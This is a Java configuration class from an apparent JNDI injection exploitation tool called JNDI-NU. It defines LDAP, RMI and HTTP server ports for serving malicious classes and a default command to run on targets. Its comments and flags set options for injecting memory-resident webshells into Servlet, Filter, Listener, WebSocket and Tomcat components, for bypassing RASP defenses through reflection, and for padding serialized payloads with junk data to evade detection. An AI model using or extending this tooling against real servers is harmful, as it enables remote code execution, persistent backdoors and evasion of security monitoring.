package com.nu1r.jndi.gadgets.Config;

import com.beust.jcommander.JCommander;
import com.beust.jcommander.Parameter;
import com.beust.jcommander.UnixStyleUsageFormatter;
import com.nu1r.jndi.Starter;
import com.nu1r.jndi.gadgets.ObjectPayload;
import com.nu1r.jndi.gadgets.annotation.Authors;
import com.nu1r.jndi.gadgets.annotation.Dependencies;
import com.nu1r.jndi.gadgets.utils.Strings;

import java.util.*;

import static org.fusesource.jansi.Ansi.ansi;

public class Config {
    public static String codeBase;

    @Parameter(names = {"-i", " --ip"}, description = "Local ip address ", order = 1)
    public static String ip = "0.0.0.0";

    @Parameter(names = {"-lP", "--ldapPort"}, description = "Ldap bind port", order = 2)
    public static int ldapPort = 1389;

    @Parameter(names = {"-rP", "--rmiPort"}, description = "rmi bind port", order = 2)
    public static int rmiPort = 1099;

    @Parameter(names = {"-hP", "--httpPort"}, description = "Http bind port", order = 3)
    public static int httpPort = 3456;

    @Parameter(names = {"-h", " --help"}, help = true, description = "Show this help")
    private static boolean help = false;

    @Parameter(names = {"-c", " --command"}, help = true, description = "RMI this command")
    public static String command = "whoami";

    @Parameter(names = {"-v", " --version"}, description = "Show version", order = 5)
    public static boolean showVersion;

    @Parameter(names = {"-g", " --gadgets"}, description = "Show gadgets", order = 5)
    public static boolean showGadgets;

    public static String rhost;
    public static String rport;

    public static void applyCmdArgs(String[] args) {
        //process cmd args
        JCommander jc = JCommander.newBuilder()
                .addObject(new Config())
                .build();
        try {
            jc.parse(args);
        } catch (Exception e) {
            System.out.println("Error: " + e.getMessage() + "\n");
            help = true;
        }

        if(showGadgets){
            final List<Class<? extends ObjectPayload>> payloadClasses =
                    new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
            Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize

            final List<String[]> rows = new LinkedList<String[]>();
            rows.add(new String[]{"Payload", "Authors", "Dependencies"});
            rows.add(new String[]{"-------", "-------", "------------"});
            for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
                rows.add(new String[]{
                        payloadClass.getSimpleName(),
                        Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
                        Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)), ", ", "", "")
                });
            }

            final List<String> lines = Strings.formatTable(rows);

            for (String line : lines) {
                System.out.println("     " + line);
            }

            System.exit(0);
        }

        if (showVersion){
            System.out.println(ansi().eraseScreen().render("" +
                    "    /█████ /██   /██ /███████  /██████ /████████                     /██           /██   /██    \n" +
                    "   |__  ██| ███ | ██| ██__  ██|_  ██_/| ██_____/                    | ██          |__/  | ██    @|BG_GREEN V2.0|@\n" +
                    "      | ██| ████| ██| ██  \\ ██  | ██  | ██       /██   /██  /██████ | ██  /██████  /██ /██████  @|BG_CYAN Author Nu1r|@\n" +
                    "      | ██| ██ ██ ██| ██  | ██  | ██  | █████   |  ██ /██/ /██__  ██| ██ /██__  ██| ██|_  ██_/  \n" +
                    " /██  | ██| ██  ████| ██  | ██  | ██  | ██__/    \\  ████/ | ██  \\ ██| ██| ██  \\ ██| ██  | ██    \n" +
                    "| ██  | ██| ██\\  ███| ██  | ██  | ██  | ██        >██  ██ | ██  | ██| ██| ██  | ██| ██  | ██ /██\n" +
                    "|  ██████/| ██ \\  ██| ███████/ /██████| ████████ /██/\\  ██| ███████/| ██|  ██████/| ██  |  ████/\n" +
                    " \\______/ |__/  \\__/|_______/ |______/|________/|__/  \\__/| ██____/ |__/ \\______/ |__/   \\___/  \n" +
                    "                                                          | ██                                  \n" +
                    "                                                          | ██                                  \n" +
                    "                                                          |__/                                  "));
            System.exit(0);
        }

        //获取当前 Jar 的名称
        String jarPath = Starter.class.getProtectionDomain().getCodeSource().getLocation().getPath();
        jc.setProgramName("java -jar JNDI-NU.jar");
        jc.setUsageFormatter(new UnixStyleUsageFormatter(jc));

        if (help) {
            jc.usage(); //if -h specified, show help and exit
            System.exit(0);
        }

        // 特别注意：最后一个反斜杠不能少啊
        Config.codeBase = "http://" + Config.ip + ":" + Config.httpPort + "/";
    }

    // 恶意类是否继承 AbstractTranslet
    public static Boolean IS_INHERIT_ABSTRACT_TRANSLET = false;

    //是否使用反射绕过RASP
    public static Boolean IS_OBSCURE = false;

    // 各种方式的内存马映射的路径
    public static String URL_PATTERN = "/nu1r";

    //内存马的类型
    public static String Shell_Type = "bx";

    //是否使用windows下Agent写入
    public static Boolean winAgent = false;

    //是否使用Linux下Agent写入
    public static Boolean linAgent = false;

    //使用脏数据混淆的选项
    public static Boolean dirtyType = false;
    public static int Type1 = 1;
    public static Boolean dirtyLength = false;
    public static int Length1 = 5000;

    // 是否在序列化数据流中的 TC_RESET 中填充脏数据
    public static Boolean IS_DIRTY_IN_TC_RESET = false;

    // 填充的脏数据长度
    public static int DIRTY_LENGTH_IN_TC_RESET = 0;

    // jboss
    public static Boolean IS_JBOSS_OBJECT_INPUT_STREAM = false;

    // 不同类型内存马的父类/接口与其关键参数的映射
    public static HashMap<String, String> KEY_METHOD_MAP = new HashMap<>();

    public static void init() {
        // Servlet 型内存马，关键方法 service
        KEY_METHOD_MAP.put("javax.servlet.Servlet", "service");
        // Filter 型内存马，关键方法 doFilter
        KEY_METHOD_MAP.put("javax.servlet.Filter", "doFilter");
        // Listener 型内存马，通常使用 ServletRequestListener， 关键方法 requestInitializedHandle
        KEY_METHOD_MAP.put("javax.servlet.ServletRequestListener", "requestInitializedHandle");
        // Websocket 型内存马，关键方法 onMessage
        KEY_METHOD_MAP.put("javax.websocket.MessageHandler$Whole", "onMessage");
        // Tomcat Upgrade 型内存马，关键方法 accept
        KEY_METHOD_MAP.put("org.apache.coyote.UpgradeProtocol", "accept");
        // Tomcat Executor 型内存马，关键方法 execute
        KEY_METHOD_MAP.put("org.apache.tomcat.util.threads.ThreadPoolExecutor", "execute");
    }
}
